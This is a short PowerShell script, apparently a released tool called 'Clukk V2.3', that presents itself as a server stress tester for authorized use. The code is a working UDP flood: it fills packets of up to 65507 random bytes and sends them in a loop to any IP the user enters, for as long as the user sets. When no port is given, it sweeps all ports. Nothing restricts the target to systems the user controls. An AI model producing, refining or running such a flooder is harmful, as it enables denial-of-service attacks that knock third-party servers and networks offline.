Write-Host @"

                Clukk
             Release V2.3

"@

Write-Host "We do not want any trouble because of abusers, please use this tool for testing or educational purposes."
Write-Host ""
Write-Host "Clukk Details:"
Write-Host ""
Write-Host @"
Clukk Release V2.3
Creator: BSP/IOD
Purpose: Stress testing
for server owners and
authorized testers.

"@
Write-Host "Multiple windows can be opened for a slight increase in speed."
Write-Host ""

Write-Host "The maximum amount of bytes allowed by UDP is 65507."
Write-Host "Use the xb2b.py tool to convert KB and MB to bytes."
$bytesAmt = [int](Read-Host "Amount of bytes")
$bytes = New-Object byte[] $bytesAmt
$rng = New-Object System.Security.Cryptography.RNGCryptoServiceProvider
$rng.GetBytes($bytes)
Write-Host ""

Write-Host "Use the url2ip.py tool to resolve the hostname."
$ip = Read-Host "IP"
Write-Host ""

$choice = (Read-Host "Would you like to specify a port? (y/n)").ToLower()

if ($choice -eq 'y') {
    $port = [int](Read-Host "Port")
    $portSpec = $true
} else {
    $port = 1
    $portSpec = $false
}
Write-Host ""

Write-Host "Use the hour2second.py tool to convert hours to seconds."
$duration = [double](Read-Host "Test time in seconds")
Write-Host ""

$timeout = [DateTime]::Now.AddSeconds($duration)
$sent = 0

$sock = New-Object System.Net.Sockets.UdpClient

while ([DateTime]::Now -lt $timeout) {
    $sock.Connect($ip, $port)
    $sock.Send($bytes, $bytes.Length) | Out-Null
    $sent++
    Write-Host "Packet #$sent of size $bytesAmt bytes was sent to address $ip on port $port."
    
    if ($portSpec -eq $false) {
        $port = if ($port -lt 65535) { $port + 1 } else { 1 }
    }
}

$sock.Close()
Write-Host "`nPackets sent: $sent"
